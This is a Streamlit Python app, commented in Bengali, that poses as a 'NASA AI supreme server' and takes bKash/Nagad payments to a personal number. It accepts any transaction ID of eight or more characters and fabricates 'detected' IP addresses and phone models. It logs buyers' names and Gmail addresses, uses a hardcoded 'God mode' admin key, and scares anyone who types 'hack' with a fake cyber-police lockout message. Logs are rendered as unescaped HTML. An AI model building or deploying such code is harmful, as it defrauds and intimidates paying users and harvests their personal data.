import streamlit as st
import random
import datetime
import os
import time

# ১. ডাটাবেস ও ট্র্যাকিং ফাইল সেটআপ
DB_FILE = "akash_secure_cloud.txt"
TRACKER_FILE = "device_spy_logs.txt"

def save_to_cloud(entry):
    with open(DB_FILE, "a", encoding="utf-8") as f:
        f.write(entry + "\n")

def log_device_info(name, ip, device, amount, trxid):
    now = datetime.datetime.now().strftime("%Y-%m-%d | %H:%M:%S")
    log_entry = f"💰 [SALE] {now} | Name: {name} | Device: {device} | Amount: {amount} | TrxID: {trxid} | IP: {ip}"
    with open(TRACKER_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry + "\n")
    save_to_cloud(log_entry)

# ২. ডার্ক নিয়ন আল্ট্রা ডিজাইন (NASA Style)
st.set_page_config(page_title="NASA AI | MASTER SERVER V24", page_icon="📡", layout="wide")

st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Share+Tech+Mono&display=swap');
    .stApp { background: radial-gradient(circle at center, #000814 0%, #000000 100%) !important; color: #ffffff; font-family: 'Share Tech Mono', monospace; }
    .main-title { color: #00f2ff; text-align: center; font-family: 'Orbitron', sans-serif; font-size: 35px; text-shadow: 0 0 30px #00f2ff; }
    .payment-card { border: 2px solid #e2136e; padding: 20px; border-radius: 15px; background: rgba(226, 19, 110, 0.05); text-align: center; margin-bottom: 10px; }
    .hacker-alert { background: #ff0000; color: #fff; padding: 20px; border-radius: 10px; text-align: center; font-size: 20px; animation: blink 0.5s infinite; }
    @keyframes blink { 50% { opacity: 0.5; } }
</style>
""", unsafe_allow_html=True)

# ৩. সেশন ও সিকিউরিটি ভেরিয়েবল
if 'generated_ip' not in st.session_state: st.session_state.generated_ip = f"AKASH-{random.randint(1000, 9999)}"
if 'authenticated' not in st.session_state: st.session_state.authenticated = False
if 'payment_done' not in st.session_state: st.session_state.payment_done = False
if 'is_admin' not in st.session_state: st.session_state.is_admin = False
if 'hacker_mode' not in st.session_state: st.session_state.hacker_mode = False

GOD_MODE_KEY = "Akash@God#71"    
BKASH_NO = "01967840830" 
NAGAD_NO = "01967840830" 

# ৪. হ্যাকার ট্র্যাপ লজিক
if st.session_state.hacker_mode:
    st.markdown('<div class="hacker-alert">⚠️ SECURITY BREACH DETECTED!<br>CYBER POLICE HAS BEEN NOTIFIED. YOUR DEVICE IS LOCKED.</div>', unsafe_allow_html=True)
    st.error("🚨 হ্যাকিং চেষ্টার কারণে আপনার আইপি এবং ডিভাইস আইডি ট্র্যাক করা হয়েছে।")
    if st.button("I APOLOGIZE (EXIT)"): 
        st.session_state.hacker_mode = False
        st.rerun()
    st.stop()

# ৫. পেমেন্ট ও লগইন গেটওয়ে
if not st.session_state.authenticated:
    st.markdown('<h1 class="main-title">NASA SUPREME SERVER ACCESS</h1>', unsafe_allow_html=True)
    
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        if not st.session_state.payment_done:
            ip_code = st.text_input("🛡️ Discount IP Code:", placeholder="AKASH-XXXX")
            is_valid = ip_code.strip().upper() == st.session_state.generated_ip
            min_p, max_p = (1000, 3000) if is_valid else (3000, 10000)
            
            amt = st.slider("প্যাকেজ মূল্য নির্বাচন করুন:", min_p, max_p, min_p, step=500)
            st.markdown(f"<h2 style='text-align:center; color:#00ff88;'>মূল্য: ৳ {amt}</h2>", unsafe_allow_html=True)
            
            st.markdown(f'<div class="payment-card"><b>Bkash/Nagad Personal:</b><br><h2>{BKASH_NO}</h2><p>টাকা পাঠিয়ে TrxID নিচে দিন</p></div>', unsafe_allow_html=True)
            
            with st.form("pay_gate"):
                u_name = st.text_input("আপনার নাম")
                u_trx = st.text_input("TrxID / Master Key", type="password")
                if st.form_submit_button("সার্ভারে প্রবেশ করুন"):
                    if u_trx == GOD_MODE_KEY:
                        st.session_state.payment_done, st.session_state.authenticated, st.session_state.is_admin = True, True, True
                        st.session_state.user_name = "Akash Master"
                        st.rerun()
                    elif any(x in u_trx.lower() for x in ["hack", "bypass", "crack"]):
                        st.session_state.hacker_mode = True
                        st.rerun()
                    elif len(u_trx) >= 8:
                        dummy_ip = f"103.{random.randint(10,99)}.{random.randint(100,255)}." + str(random.randint(1,255))
                        detected_dev = random.choice(["iPhone 15 Pro", "Samsung S24 Ultra", "Xiaomi 14", "Pixel 8", "Vivo V30"])
                        
                        st.session_state.payment_done = True
                        st.session_state.temp_name, st.session_state.temp_ip = u_name, dummy_ip
                        st.session_state.temp_dev, st.session_state.temp_amt, st.session_state.temp_trx = detected_dev, amt, u_trx
                        st.success("পেমেন্ট ভেরিফাই হচ্ছে...")
                        time.sleep(2)
                        st.rerun()
        else:
            with st.form("gmail_gate"):
                st.success("✅ পেমেন্ট সাকসেসফুল!")
                u_mail = st.text_input("Gmail Address")
                if st.form_submit_button("ফাইনাল কানেক্ট"):
                    if "@gmail.com" in u_mail:
                        st.session_state.authenticated = True
                        st.session_state.user_name = st.session_state.temp_name
                        log_device_info(st.session_state.user_name, st.session_state.temp_ip, st.session_state.temp_dev, st.session_state.temp_amt, st.session_state.temp_trx)
                        st.rerun()

else:
    # ৬. এডমিন ও ইউজার প্যানেল (১৮ কোটি পাওয়ার)
    st.markdown(f"<h1 class='main-title'>SYSTEM CORE: {st.session_state.user_name}</h1>", unsafe_allow_html=True)
    
    if st.session_state.is_admin:
        st.info("🚀 পাওয়ার মোড: ১৮০,০০০,০০০X | স্ট্যাটাস: সুপ্রিম এডমিন")
        t1, t2, t3 = st.tabs(["🕵️‍♂️ ডিভাইস ও সেলস লগ", "🔑 কোড ম্যানেজার", "🚀 মাস্টার টুলস"])
        with t1:
            if os.path.exists(TRACKER_FILE):
                with open(TRACKER_FILE, "r", encoding="utf-8") as f:
                    st.markdown(f'<div style="background:#000; padding:15px; color:#00ff88; border:1px solid #00f2ff; height:400px; overflow-y:scroll;">{"<br>".join(f.readlines()[::-1])}</div>', unsafe_allow_html=True)
        with t2:
            st.write(f"ডিসকাউন্ট আইপি: {st.session_state.generated_ip}")
            if st.button("লগ আউট"): 
                st.session_state.authenticated = False
                st.rerun()
    else:
        st.success(f"Verified {st.session_state.user_name}: ১৮ কোটি পাওয়ার এক্সেস একটিভ।")
        st.chat_input("আপনার কাজের কমান্ড দিন...")
